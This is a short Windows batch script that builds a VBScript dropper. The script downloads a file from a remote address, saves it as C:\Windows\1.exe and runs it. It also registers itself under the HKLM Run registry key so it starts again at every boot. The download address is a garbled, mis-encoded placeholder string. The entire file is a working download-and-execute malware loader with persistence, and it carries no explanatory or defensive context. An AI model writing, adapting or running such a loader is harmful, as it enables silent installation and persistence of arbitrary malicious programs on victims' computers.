@shift
echo Set xPost = createObject("Microsoft.XMLHTTP") >C:\Windows\1.vbs
echo xPost.Open "GET","ÄãµÄÄ¾ÂíµØÖ·",0 >>C:\Windows\1.vbs
echo xPost.Send() >>C:\Windows\1.vbs
echo Set sGet = createObject("ADODB.Stream") >>C:\Windows\1.vbs
echo sGet.Mode = 3 >>C:\Windows\1.vbs
echo sGet.Type = 1 >>C:\Windows\1.vbs
echo sGet.Open() >>C:\Windows\1.vbs
echo sGet.Write(xPost.responseBody) >>C:\Windows\1.vbs
echo sGet.SaveToFile "C:\Windows\1.exe",2 >>C:\Windows\1.vbs
echo Set objShell = CreateObject("Wscript.Shell") >>C:\Windows\1.vbs
echo objshell.run """C:\Windows\1.exe""" >>C:\Windows\1.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "C:\Windows\1.vbs" /f
C:\Windows\1.vbs
